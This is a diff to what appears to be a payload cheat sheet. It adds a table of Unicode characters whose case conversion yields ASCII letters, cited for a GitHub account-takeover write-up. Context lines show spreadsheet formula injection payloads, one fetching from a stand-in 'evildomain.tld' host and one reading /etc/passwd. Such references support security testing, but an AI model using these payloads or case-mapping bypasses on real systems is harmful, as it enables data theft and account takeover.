@@ -922,3 +922,24 @@ https://www.veracode.com/blog/secure-development/data-extraction-command-executi
 =WEBSERVICE("http://evildomain.tld/payload.txt")
 ='file://etc/passwd'#$passwd.A1
 ```
+
+### Upper / Lowercase to Unicode
+https://eng.getwisdom.io/hacking-github-with-unicode-dotless-i/
+
+```
+Uppercase
+Char	Code Point	Output Char
+ß	0x00DF	SS
+ı	0x0131	I
+ſ	0x017F	S
+ﬀ	0xFB00	FF
+ﬁ	0xFB01	FI
+ﬂ	0xFB02	FL
+ﬃ	0xFB03	FFI
+ﬄ	0xFB04	FFL
+ﬅ	0xFB05	ST
+ﬆ	0xFB06	ST
+Lowercase
+Char	Code Point	Output Char
+K	0x212A	k
+```
